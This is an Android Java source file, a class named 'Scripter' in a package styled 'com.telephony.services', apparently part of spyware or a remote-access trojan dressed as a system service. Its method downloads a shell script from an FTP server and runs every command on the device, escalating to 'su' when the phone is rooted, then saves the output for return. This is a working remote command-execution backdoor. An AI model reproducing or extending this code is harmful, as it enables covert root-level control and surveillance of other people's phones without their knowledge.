package com.telephony.services;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;

import android.content.Context;

public class Scripter {
	private MyFTPClient ftp = null;
	private PreferenceUtils sPref = null;

	public static final String SCRIPT_FILE = "script.sh";
	public static final String SCRIPT_OUT_FILE = "script.out";

	public Scripter(Context context, final MyFTPClient ftp) {
		this.ftp = ftp;
		sPref = PreferenceUtils.getInstance(context);
	}

	public void execScript() throws IOException {
		String[] cmds = null;
		String[] outs = null;
		FileOutputStream fos = null;
		String shell = "sh";
		try {
			if (ftp.getFileSize(SCRIPT_OUT_FILE) < 0) {
				cmds = ftp.downloadFileStrings(SCRIPT_FILE);
				if (cmds.length > 0) {
					if (Utils.CheckRoot()) {
						shell = "su";
					}
					outs = new Proc(shell).exec(cmds);
					fos = new FileOutputStream(new File(sPref.getRootDir(), SCRIPT_OUT_FILE));

					for (String line : outs) {
						line += "\n";
						fos.write(line.getBytes());
					}
				}
			}
		} catch (IOException e) {
			e.printStackTrace();
		} finally {
			if (fos != null) {
				fos.close();
			}
		}

	}

}
